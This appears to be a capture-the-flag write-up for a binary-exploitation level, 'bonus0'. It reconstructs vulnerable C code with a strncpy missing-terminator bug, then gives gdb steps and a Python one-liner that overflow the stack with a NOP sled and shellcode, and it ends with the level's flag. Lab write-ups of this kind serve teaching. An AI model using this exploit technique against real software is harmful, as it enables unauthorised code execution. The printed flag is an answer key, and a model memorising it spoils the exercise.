# bonus0 — non-terminated strncpy → overflow with a NOP-sled shellcode

**Teaches:** the `strncpy` "no null terminator" trap; NOP sleds. Re-read primer §2–§4.

## 1. What the binary does
Prompts ` - ` twice, reads two strings, prints them joined by a space.

## 2. Reconstructed C
```c
char *p(char *s, char *str) {
    char buffer[4096];
    puts(str);
    read(0, buffer, 4096);
    *strchr(buffer, '\n') = 0;
    return strncpy(s, buffer, 20);     // copies 20 bytes; NO '\0' if src >= 20
}
char *pp(char *buffer) {
    char b[20], a[20];
    p(a, " - "); p(b, " - ");
    strcpy(buffer, a);                 // a not terminated -> reads into b
    buffer[strlen(buffer)] = ' ';
    return strcat(buffer, b);          // concatenation overflows main's buffer[42]
}
int main(void) { char buffer[42]; pp(buffer); puts(buffer); return 0; }
```

## 3. The vulnerability
`strncpy(s, ..., 20)` does **not** null-terminate when the source is ≥ 20 bytes.
So `a` and `b` run together, and `strcpy`/`strcat` build a string longer than
`main`'s `buffer[42]`, overflowing its saved return address. **Offset to EIP = 9**
(inside the concatenated tail).

## 4. Strategy
- No `/bin/sh` string → use shellcode. `read(0, buffer, 4096)` in `p()` gives us a
  huge buffer to hide a **NOP sled + shellcode** in.
- Return address = any address that lands inside the NOP sled; NOPs slide
  execution down into the shellcode.

## 5. Step by step
1. Offset of EIP = 9 (pattern crash).
2. Find the big buffer's address:
   ```
   (gdb) disassemble p        # lea eax,[ebp-0x1008]  -> buffer start
   (gdb) b *p+28 ; run ; x $ebp-0x1008   -> e.g. 0xbfffe680
   ```
   Pick an address inside your NOP sled, e.g. `0xbfffe680 + 0x50 = 0xbfffe6d0`.
   *(Stack addresses shift with the environment — verify yours.)*

## 6. Exploit
```
(python -c 'print "\x90"*100 + "<28-byte shellcode>"';        # 1st input: sled+shellcode
 python -c 'print "A"*9 + "\xd0\xe6\xff\xbf" + "B"*7';         # 2nd input: pad(9)+ret
 cat) | ./bonus0
```
**Why it works:** the first input fills the 4096-byte buffer with a NOP sled and
shellcode. The second input overflows `main`'s buffer at offset 9, putting an
address inside the sled onto EIP. Execution slides through the NOPs into the shellcode.

Flag → `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
